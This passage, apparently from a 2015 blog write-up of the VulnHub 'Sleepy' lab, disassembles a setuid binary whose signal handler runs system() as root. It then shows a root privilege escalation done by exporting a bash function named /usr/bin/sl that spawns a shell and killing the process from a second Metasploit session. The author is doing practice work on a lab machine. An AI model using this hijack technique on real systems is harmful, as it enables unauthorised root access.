</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400850</span>    <span class="no">ba98000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x98</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400855</span>    <span class="no">be00000000</span>   <span class="no">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040085a</span>    <span class="mi">4889</span><span class="no">c7</span>       <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x00400660</span> <span class="p">(</span><span class="no">fcn.00400656</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040085d</span>    <span class="no">e8fefdffff</span>   <span class="no">call</span> <span class="no">sym.imp.memset</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.memset</span><span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400862</span>    <span class="mi">48</span><span class="no">c78560fff.</span> <span class="no">mov</span> <span class="no">qword</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span><span class="p">,</span> <span class="no">sym.sigHandler</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040086d</span>    <span class="no">c745e800000.</span> <span class="no">mov</span> <span class="no">dword</span> <span class="err">[</span><span class="no">rbp-0x18</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400874</span>    <span class="mi">488</span><span class="no">d8560fff.</span> <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040087b</span>    <span class="no">ba00000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400880</span>    <span class="mi">4889</span><span class="no">c6</span>       <span class="no">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rax</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400883</span>    <span class="no">bf02000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x2</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x00400610</span> <span class="p">(</span><span class="no">fcn.00400606</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400888</span>    <span class="no">e883fdffff</span>   <span class="no">call</span> <span class="no">sym.imp.sigaction</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.sigaction</span><span class="p">()</span>
</span><span class='line'><span class="na">...</span> <span class="no">turncate</span> <span class="no">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>From the result above, I notice that there is a function <code>sym.sigHandler</code> be used to deal with signal <code>SIGINT(0x2)</code> and <code>SIGTERM(0xf)</code>, so I decided to print it out</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">[0</span><span class="nf">x004006b0</span><span class="err">]&gt;</span> <span class="no">pdf</span> <span class="err">@</span> <span class="no">sym.sigHandler</span>
</span><span class='line'><span class="err">/</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="no">sym.sigHandler</span> <span class="mi">281</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040081f</span>    <span class="mi">55</span>           <span class="no">push</span> <span class="no">rbp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400820</span>    <span class="mi">4889</span><span class="no">e5</span>       <span class="no">mov</span> <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400823</span>    <span class="mi">4883</span><span class="no">ec10</span>     <span class="no">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x10</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400827</span>    <span class="mi">897</span><span class="no">dfc</span>       <span class="no">mov</span> <span class="err">[</span><span class="no">rbp-0x4</span><span class="err">]</span><span class="p">,</span> <span class="no">edi</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040082a</span>    <span class="no">b800000000</span>   <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040082f</span>    <span class="no">e899ffffff</span>   <span class="no">call</span> <span class="no">sym.train</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.train</span><span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400834</span>    <span class="no">bf00000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400839</span>    <span class="no">e862feffff</span>   <span class="no">call</span> <span class="no">sym.imp.exit</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.exit</span><span class="p">()</span>
</span><span class='line'><span class="err">/</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="no">sym.main</span> <span class="mi">250</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040083e</span>    <span class="mi">55</span>           <span class="no">push</span> <span class="no">rbp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040083f</span>    <span class="mi">4889</span><span class="no">e5</span>       <span class="no">mov</span> <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400842</span>    <span class="mi">4881</span><span class="no">eca0000.</span> <span class="no">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0xa0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400849</span>    <span class="mi">488</span><span class="no">d8560fff.</span> <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400850</span>    <span class="no">ba98000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x98</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400855</span>    <span class="no">be00000000</span>   <span class="no">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040085a</span>    <span class="mi">4889</span><span class="no">c7</span>       <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x00400660</span> <span class="p">(</span><span class="no">fcn.00400656</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040085d</span>    <span class="no">e8fefdffff</span>   <span class="no">call</span> <span class="no">sym.imp.memset</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.memset</span><span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400862</span>    <span class="mi">48</span><span class="no">c78560fff.</span> <span class="no">mov</span> <span class="no">qword</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span><span class="p">,</span> <span class="no">sym.sigHandler</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040086d</span>    <span class="no">c745e800000.</span> <span class="no">mov</span> <span class="no">dword</span> <span class="err">[</span><span class="no">rbp-0x18</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400874</span>    <span class="mi">488</span><span class="no">d8560fff.</span> <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040087b</span>    <span class="no">ba00000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400880</span>    <span class="mi">4889</span><span class="no">c6</span>       <span class="no">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rax</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400883</span>    <span class="no">bf02000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x2</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x00400610</span> <span class="p">(</span><span class="no">fcn.00400606</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400888</span>    <span class="no">e883fdffff</span>   <span class="no">call</span> <span class="no">sym.imp.sigaction</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.sigaction</span><span class="p">()</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040088d</span>    <span class="mi">488</span><span class="no">d8560fff.</span> <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400894</span>    <span class="no">ba00000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400899</span>    <span class="mi">4889</span><span class="no">c6</span>       <span class="no">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rax</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040089c</span>    <span class="no">bf0f000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0xf</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004008a1</span>    <span class="no">e86afdffff</span>   <span class="no">call</span> <span class="no">sym.imp.sigaction</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.sigaction</span><span class="p">()</span>
</span><span class='line'><span class="na">...</span> <span class="no">turncate</span> <span class="no">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here is another function &ldquo;sym.train&rdquo; be called:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">[0</span><span class="nf">x004006b0</span><span class="err">]&gt;</span> <span class="no">pdf</span> <span class="err">@</span> <span class="no">sym.train</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x0040082f</span> <span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x004007cd</span> <span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x0040080f</span> <span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">/</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="no">sym.train</span> <span class="mi">66</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007cd</span>    <span class="mi">55</span>           <span class="no">push</span> <span class="no">rbp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007ce</span>    <span class="mi">4889</span><span class="no">e5</span>       <span class="no">mov</span> <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007d1</span>    <span class="no">ba00000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007d6</span>    <span class="no">be00000000</span>   <span class="no">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007db</span>    <span class="no">bf00000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007e0</span>    <span class="no">b800000000</span>   <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007e5</span>    <span class="no">e836feffff</span>   <span class="no">call</span> <span class="no">sym.imp.setresuid</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.setresuid</span><span class="p">(</span><span class="no">unk</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007ea</span>    <span class="no">ba00000000</span>   <span class="no">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007ef</span>    <span class="no">be00000000</span>   <span class="no">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007f4</span>    <span class="no">bf00000000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007f9</span>    <span class="no">b800000000</span>   <span class="no">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0x0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x004007fe</span>    <span class="no">e82dfeffff</span>   <span class="no">call</span> <span class="no">sym.imp.setresgid</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.setresgid</span><span class="p">()</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400803</span>    <span class="no">bfec094000</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">str.usrbinslal</span>
</span><span class='line'><span class="err">|</span>           <span class="err">;</span> <span class="nf">CODE</span> <span class="p">(</span><span class="no">CALL</span><span class="p">)</span> <span class="no">XREF</span> <span class="no">from</span> <span class="mi">0x00400640</span> <span class="p">(</span><span class="no">fcn.00400636</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400808</span>    <span class="no">e833feffff</span>   <span class="no">call</span> <span class="no">sym.imp.system</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">sym.imp.system</span><span class="p">()</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040080d</span>    <span class="mi">5</span><span class="no">d</span>           <span class="no">pop</span> <span class="no">rbp</span>
</span><span class='line'><span class="err">\</span>           <span class="err">0</span><span class="nf">x0040080e</span>    <span class="no">c3</span>           <span class="no">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>In this function <code>sym.train</code>, the attacker noticed that uid and gid have been set to &lsquo;0&rsquo; (which is ROOT) and then make a system call with parameter <code>str.usrbinslal</code>.</p>

<p>By checking the string of &ldquo;str.usrbinslal&rdquo; as follow, I know the system function has been called like this <code>system("/usr/bin/sl -al")</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">[0</span><span class="nf">x004006b0</span><span class="err">]&gt;</span> <span class="no">ps</span> <span class="err">@</span> <span class="no">str.usrbinslal</span>
</span><span class='line'><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sl</span> <span class="p">-</span><span class="no">al</span>
</span></code></pre></td></tr></table></div></figure>


<p>Based on <a href="https://research.g0blin.co.uk/devrandom-sleepy-vulnhub-writeup/" title="g0blin's walkthrough">g0blin&rsquo;s post</a>, I defined an evil function by using sl&rsquo;s full path as the name <code>/usr/bin/sl</code> and then run the vulnerable program <code>nightmare</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.2<span class="nv">$ </span><span class="k">function</span> /usr/bin/sl <span class="o">()</span> <span class="o">{</span> /bin/bash<span class="p">;</span> <span class="o">}</span>
</span><span class='line'><span class="k">function</span> /usr/bin/sl <span class="o">()</span> <span class="o">{</span> /bin/bash<span class="p">;</span> <span class="o">}</span>
</span><span class='line'>bash-4.2<span class="nv">$ </span><span class="nb">export</span> -f /usr/bin/sl
</span><span class='line'><span class="nb">export</span> -f /usr/bin/sl
</span><span class='line'>bash-4.2<span class="nv">$ </span>/usr/bin/nightmare
</span><span class='line'>/usr/bin/nightmare
</span><span class='line'>Error opening terminal: unknown.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>?
</span></code></pre></td></tr></table></div></figure>


<p>In order to send <code>SIGTERM</code> signal to <code>nightware</code>, I opened another MSF session by refreshing the trojan web page.</p>

<p>In the new session, I sent <code>SIGTERM</code> signal to process <code>nightmare</code> by using command <code>kill -15 &lt;pid&gt;</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.2<span class="nv">$ </span>ps aux <span class="p">|</span> grep night
</span><span class='line'>ps aux <span class="p">|</span> grep night
</span><span class='line'>root      <span class="m">2312</span>  0.0  0.0   <span class="m">4164</span>   <span class="m">356</span> pts/0    S+   00:29   0:00 /usr/bin/nightmare
</span><span class='line'>tomcat    <span class="m">2329</span>  0.0  0.1   <span class="m">9032</span>   <span class="m">672</span> pts/1    R+   00:33   0:00 grep night
</span><span class='line'>bash-4.2<span class="nv">$ </span><span class="nb">kill</span> -15 2312
</span><span class='line'><span class="nb">kill</span> -15 2312
</span></code></pre></td></tr></table></div></figure>


<p>Now change back to previous session and we got ROOT!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.2<span class="nv">$ </span><span class="k">function</span> /usr/bin/sl <span class="o">()</span> <span class="o">{</span> /bin/bash<span class="p">;</span> <span class="o">}</span>
</span><span class='line'>bash-4.2<span class="nv">$ </span><span class="nb">export</span> -f /usr/bin/sl
</span><span class='line'>bash-4.2<span class="nv">$ </span>/usr/bin/nightmare
</span><span class='line'>Error opening terminal: unknown.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>?
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>? bash-4.2#
</span><span class='line'>
</span><span class='line'>bash-4.2# id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,91<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:tomcat_t:s0
</span><span class='line'>bash-4.2# ls -al /root
</span><span class='line'>ls -al /root
</span><span class='line'>total 44
</span><span class='line'>dr-xr-x---.  <span class="m">3</span> root root  <span class="m">4096</span> Jun <span class="m">19</span> 00:52 .
</span><span class='line'>drwxr-xr-x. <span class="m">18</span> root root  <span class="m">4096</span> Nov <span class="m">13</span> 21:59 ..
</span><span class='line'>lrwxrwxrwx.  <span class="m">1</span> root root     <span class="m">9</span> Jan <span class="m">18</span>  <span class="m">2015</span> .bash_history -&gt; /dev/null
</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root    <span class="m">18</span> Dec <span class="m">29</span>  <span class="m">2013</span> .bash_logout
</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root   <span class="m">176</span> Dec <span class="m">29</span>  <span class="m">2013</span> .bash_profile
</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root   <span class="m">100</span> Dec <span class="m">29</span>  <span class="m">2013</span> .cshrc
</span><span class='line'>-rw-------.  <span class="m">1</span> root root   <span class="m">133</span> Jan <span class="m">18</span>  <span class="m">2015</span> .lesshst
</span><span class='line'>drwx------.  <span class="m">2</span> root root     <span class="m">6</span> Jun <span class="m">19</span> 08:39 .ssh
</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root   <span class="m">129</span> Dec <span class="m">29</span>  <span class="m">2013</span> .tcshrc
</span><span class='line'>-r--------.  <span class="m">1</span> root root <span class="m">14892</span> Jul <span class="m">14</span> 14:25 flag.txt
</span><span class='line'>bash-4.2# cat /root/flag.txt
</span><span class='line'>cat /root/flag.txt
</span><span class='line'>Well <span class="k">done</span>!
</span><span class='line'>
</span><span class='line'>Here<span class="err">&#39;</span>s your flag: 3eb030c6ab099b0a355712fe38d59ffb
</span><span class='line'>
</span><span class='line'>Ascii Art: Mark Van Hooren
</span><span class='line'><span class="o">(</span>http://www.retrojunkie.com/asciiart/cartchar/snowwhit.htm<span class="o">)</span>
</span><span class='line'>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-
</span><span class='line'>... turncate ...
</span></code></pre></td></tr></table></div></figure>


<p>Thanks Sagi- and cheers g0blin!</p>

<!--- Reference -->



</div>


<div class="meta">
	<div class="date">




2015-11-13 16:44:46 +1100</div>
	

<div class="tags">

	<a class='category' href='/blog/categories/jdwp/'>jdwp</a>, <a class='category' href='/blog/categories/sleepy/'>sleepy</a>, <a class='category' href='/blog/categories/tomcat/'>tomcat</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>

</div>


	
</div></article>

	<div class="share">
	<div class="addthis_toolbox addthis_default_style ">
	
	
	<a class="addthis_button_tweet"></a>
	
	
<!---	<a class="addthis_counter addthis_pill_style"></a> --->
	</div>
  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
</div>


</div>
	<footer id="footer" class="inner">Copyright &copy; 2020

    <font color="green">F4l13n5n0w</font>

<br>
Powered by Octopress.
</footer>
	<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->






</body>
</html>
